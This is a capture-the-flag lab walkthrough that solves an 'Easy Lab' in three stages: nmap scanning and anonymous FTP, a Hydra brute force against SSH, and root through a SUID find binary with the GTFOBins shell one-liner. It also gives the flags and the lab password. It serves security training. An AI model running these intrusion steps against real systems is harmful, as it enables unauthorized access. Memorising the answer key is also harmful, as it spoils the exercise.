## Easy Lab - Complete Walkthrough

This document outlines the intended solution path for the Easy Lab.

### 1. Enumeration & Flag 1

* **Action:** Perform a network scan on the target IP address.
    ```bash
    nmap -sC -sV <TARGET_IP>
    ```
* **Result:** The scan reveals that port 21 (FTP) is open and allows anonymous login.
* **Action:** Log into the FTP server.
    ```bash
    ftp <TARGET_IP>
    # User: anonymous
    # Pass: (blank)
    ```
* **Result:** List the files with `ls`. You will see `FLAG_ENUM.txt`. Download it with `get FLAG_ENUM.txt`.
* **Flag 1:** `OmahTIAcademy{enum_flag_from_ftp_file}`

### 2. Initial Access & Flag 2

* **Action:** While on the FTP server, download the other files:`note.txt`, and `wordlist.txt`.
* **Clues:** The `note.txt` file gives the username `easyuser`, and `wordlist.txt` provides a short list of passwords.
* **Action:** Use Hydra to brute-force the SSH service with the discovered information.
    ```bash
    hydra -l easyuser -P wordlist.txt <TARGET_IP> ssh
    ```
* **Result:** Hydra will find the password `R3sistance`.
* **Action:** Log into the machine via SSH.
    ```bash
    ssh easyuser@<TARGET_IP>
    ```
* **Action:** After the ssh into easyuser, we'll open the flag2.txt there and obtain the flag using the 'cat' command.
* **Flag 2:** `OmahTIAcademy{Easy_ssh_flag}`

### 3. Privilege Escalation & Flag 3

* **Action:** Once on the machine, enumerate for privilege escalation vectors. A common manual check is for SUID binaries.
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
* **Result:** The output will show `/usr/bin/find` has the SUID bit set.
* **Action:** Use the command from GTFOBins to exploit this misconfiguration.
    ```bash
    /usr/bin/find . -exec /bin/sh -p \; -quit
    ```
* **Result:** You will gain a root shell.
* **Flag 3:** Navigate to the root directory and read the final flag.
    ```bash
    cat /root/flag3.txt
    ```
